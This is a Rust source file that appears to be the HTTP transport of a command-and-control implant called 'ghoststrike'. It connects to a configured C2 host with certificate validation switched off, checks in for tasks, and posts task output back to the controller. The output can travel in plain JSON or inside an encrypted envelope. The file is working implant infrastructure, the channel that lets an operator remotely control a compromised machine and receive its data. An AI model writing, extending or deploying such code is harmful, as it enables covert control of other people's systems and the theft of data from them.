use anyhow::{bail, Result};
use reqwest::Client;
use uuid::Uuid;

use ghoststrike_common::{
    decrypt, encrypt, AgentCheckinReq, AgentCheckinResp, EncryptedEnvelope,
    ListenerProtocol, SessionKey, Task, TaskResultReq,
};
use crate::config::AgentConfig;

pub struct HttpTransport {
    client:   Client,
    base_url: String,
    session_key: Option<SessionKey>,
}

impl HttpTransport {
    pub fn new(cfg: &AgentConfig) -> Result<Self> {
        let scheme = match cfg.protocol {
            ListenerProtocol::Https => "https",
            _                       => "http",
        };
        let base_url = format!("{}://{}:{}", scheme, cfg.c2_host, cfg.c2_port);

        let session_key = if cfg.c2_key.is_empty() {
            None
        } else {
            let raw = hex::decode(&cfg.c2_key)
                .map_err(|_| anyhow::anyhow!("invalid c2_key hex"))?;
            Some(SessionKey::from_bytes(&raw)
                .map_err(|e| anyhow::anyhow!("{e}"))?)
        };

        let client = Client::builder()
            .danger_accept_invalid_certs(true)
            .build()?;

        Ok(Self { client, base_url, session_key })
    }

    fn encrypt_body(&self, agent_id: Uuid, plaintext: &[u8]) -> Result<EncryptedEnvelope> {
        let key = self.session_key.as_ref()
            .ok_or_else(|| anyhow::anyhow!("no session key"))?;
        let ct = encrypt(key, plaintext)?;
        let (nonce, ciphertext) = ct.split_at(12);
        Ok(EncryptedEnvelope {
            agent_id,
            nonce: nonce.to_vec(),
            ciphertext: ciphertext.to_vec(),
        })
    }

    fn decrypt_envelope(&self, env: &EncryptedEnvelope) -> Result<Vec<u8>> {
        let key = self.session_key.as_ref()
            .ok_or_else(|| anyhow::anyhow!("no session key"))?;
        let mut data = env.nonce.clone();
        data.extend_from_slice(&env.ciphertext);
        decrypt(key, &data).map_err(|e| anyhow::anyhow!("{e}"))
    }
}

#[async_trait::async_trait]
impl super::TransportInner for HttpTransport {
    async fn checkin(&self, req: &AgentCheckinReq) -> Result<AgentCheckinResp> {
        if let Some(_) = &self.session_key {
            let body = serde_json::to_vec(req)?;
            let env  = self.encrypt_body(req.agent_id, &body)?;
            let resp_env = self.client
                .post(format!("{}/api/checkin/enc", self.base_url))
                .json(&env)
                .send()
                .await?
                .json::<EncryptedEnvelope>()
                .await?;
            let plain = self.decrypt_envelope(&resp_env)?;
            Ok(serde_json::from_slice(&plain)?)
        } else {
            let resp = self.client
                .post(format!("{}/api/checkin", self.base_url))
                .json(req)
                .send()
                .await?
                .json::<AgentCheckinResp>()
                .await?;
            Ok(resp)
        }
    }

    async fn report_task(&self, agent_id: Uuid, task: &Task, output: String) -> Result<()> {
        let req = TaskResultReq {
            task_id:  task.id,
            agent_id,
            output,
            success:  true,
        };
        if let Some(_) = &self.session_key {
            let body = serde_json::to_vec(&req)?;
            let env  = self.encrypt_body(agent_id, &body)?;
            self.client
                .post(format!("{}/api/taskresult/enc", self.base_url))
                .json(&env)
                .send()
                .await?;
        } else {
            self.client
                .post(format!("{}/api/taskresult", self.base_url))
                .json(&req)
                .send()
                .await?;
        }
        Ok(())
    }
}
